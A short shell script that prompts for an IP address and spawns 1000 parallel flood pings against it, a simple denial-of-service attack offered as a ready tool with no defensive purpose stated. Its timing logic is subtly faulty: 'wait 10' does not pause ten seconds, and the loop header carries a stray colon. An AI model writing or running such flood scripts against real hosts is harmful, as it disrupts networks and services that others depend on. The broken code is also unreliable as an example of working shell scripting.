#!/bin/sh
echo "THis script must be launched in root"
echo "Local IP adresse :"
read IP

echo "Ping flood for $IP"
 
for i in `seq 1 1000`:
	do
		ping -f $IP &
	done
	
wait 10
killall ping		 
